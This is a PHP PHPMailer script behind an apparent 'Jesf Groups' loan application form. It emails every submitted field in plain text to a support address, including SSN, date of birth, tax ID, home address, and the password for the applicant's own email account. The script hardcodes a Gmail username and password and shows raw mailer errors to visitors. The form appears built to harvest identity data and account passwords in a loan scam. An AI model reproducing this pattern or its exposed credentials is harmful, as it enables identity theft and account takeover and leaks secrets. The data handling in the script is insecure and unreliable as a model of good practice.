<?php
/**
 * This example shows how to handle a simple contact form.
 */

//Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
$msg = '';
//Don't run this unless we're handling a form submission
if (array_key_exists('email', $_POST)) {
    date_default_timezone_set('Etc/UTC');
    require 'autoload.php';
    //Create a new PHPMailer instance
    $mail = new PHPMailer;
    //Tell PHPMailer to use SMTP - requires a local mail server
    //Faster and safer than using mail()
    $mail->isSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = 'smtp.gmail.com';
$mail->Port = 587;
//Whether to use SMTP authentication
$mail->SMTPAuth = true;
//Username to use for SMTP authentication - use full email address for gmail
$mail->Username = "cornellekacy4@gmail.com";
//Password to use for SMTP authentication
$mail->Password = "cornellekacy456";
    //Use a fixed address in your own domain as the from address
    //**DO NOT** use the submitter's address here as it will be forgery
    //and will cause your messages to fail SPF checks
    $mail->setFrom('support@jesf-groups.com', $_POST['fname']);
    //Send the message to yourself, or whoever should receive contact for submissions
    $mail->addAddress('support@jesf-groups.com', 'Application For Loan');
    //Put the submitter's address in a reply-to header
    //This will fail if the address provided is invalid,
    //in which case we should ignore the whole request
    if ($mail->addReplyTo($_POST['email'], $_POST['fname'])) {
        $mail->Subject = 'Jesf Groups Worldwide';
        //Keep it simple - don't use HTML
        $mail->isHTML(false);
        //Build a simple message body
        $mail->Body = <<<EOT
Enter your desired credit limit: {$_POST['limit']}
Choosed Currency: {$_POST['currency']}
Country: {$_POST['country']}
What will be your primary use for these funds?: {$_POST['fund']}


Business name : {$_POST['bname']}
Business address: {$_POST['badd']}
ZIP code: {$_POST['zipcode']}
City: {$_POST['city']}
State: {$_POST['state']}
Business phone: {$_POST['bphone']}


First name: {$_POST['fname']}
Last name: {$_POST['lname']}


Email address you use: {$_POST['email']}
Create a password: {$_POST['pass']}
Confirm password: {$_POST['cpass']}


Industry : {$_POST['indust']}
Legal entity type: {$_POST['legalentity']}
Years in business: {$_POST['byears']}
Business Tax ID: {$_POST['btaxid']}
Gross business revenue from most recent fiscal year: {$_POST['yrevenue']}
Number of employees: {$_POST['nworkers']}
Country: {$_POST['country1']}
Home address: {$_POST['hadd']}
Apt/unit: {$_POST['apt1']}
ZIP code : {$_POST['zipcode1']}
City: {$_POST['city1']}
State: {$_POST['state1']}
Personal phone: {$_POST['pphone']}
SSN For U.S Applicant: {$_POST['ssn']}
Date of birth: {$_POST['date']}
Your primary source of income : {$_POST['pincome']}


On which day do you want to make payments: {$_POST['week']}
On which date do you want to make payments: {$_POST['month']}
EOT;
        //Send the message, check for errors
        if (!$mail->send()) {
            //The reason for failing to send will be in $mail->ErrorInfo
            //but you shouldn't display errors to users - process the error, log it on your server.
            $msg = 'Sorry, something went wrong. Please try again later.'. $mail->ErrorInfo;
        } else {
            echo "<script>alert('Message Successfully Sent we will get back to you shortly');
            window.location.href = 'https://jesf-groups.com'</script>";
        }
    } else {
        $msg = 'Invalid email address, message ignored.';
    }
}
?>